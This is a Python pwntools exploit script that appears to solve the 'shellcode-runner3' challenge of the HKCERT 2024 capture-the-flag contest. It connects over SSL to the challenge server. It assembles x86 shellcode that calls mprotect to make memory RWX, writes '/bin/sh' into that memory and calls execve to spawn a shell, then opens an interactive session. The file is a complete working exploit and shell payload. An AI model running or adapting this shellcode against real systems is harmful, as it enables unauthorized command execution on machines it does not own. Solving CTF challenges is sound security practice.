#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("c49-shellcode-runner3.hkcert24.pwnable.hk", 1337, ssl = True)

    return r


def main():
    r = conn()
    
    shellcode = asm("""
            /* Convert memory region to RWX */
            mov ebx, 0x13370000;
            mov ecx, 0x1000;
            mov edx, 7;
            mov eax, 0x7d;
            int 0x80;
        
            /* Move '/bin/sh\x00' to a writable region */
            mov r10, 0x0068732f6e69622f;
            mov r11, 0x133700f0;
            mov qword ptr [r11], r10;

            /* Spwn that mf shell */
            mov ebx, 0x133700f0;
            xor ecx, ecx;
            xor edx, edx;
            mov eax, 0x0b;
            int 0x80;
        """)

    assert len(shellcode) < 100
    
    r.sendafter(b": ", shellcode)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
